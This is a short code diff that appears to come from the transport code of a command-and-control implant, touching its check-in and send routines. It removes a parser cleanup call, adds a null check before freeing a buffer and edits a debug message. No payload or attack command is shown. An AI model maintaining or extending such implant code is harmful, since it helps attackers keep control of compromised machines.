@@ -54,8 +54,6 @@ auto DECLFN Transport::Checkin(
 
     KhDbg( "checkin routine done..." );
 
-    Self->Psr->Destroy( CheckinPsr );
-
     return TRUE;
 }
 
@@ -170,11 +168,13 @@ auto DECLFN Transport::Send(
                 Mem::Zero( U_PTR( TmpBuffer ), BytesRead );
                 
             } while ( BytesRead > 0 );
-            
-            Self->Hp->Free( TmpBuffer );
+
+            if ( TmpBuffer ) {
+                Self->Hp->Free( TmpBuffer );
+            }
         }
         
-        KhDbg( "request: at %p [%d bytes]\n", RespBuffer, RespSize );
+        KhDbg( "request: at %p [%d bytes]", RespBuffer, RespSize );
 
         if ( RespBuffer ) *RecvData = RespBuffer;
         if ( RecvSize   ) *RecvSize = RespSize;
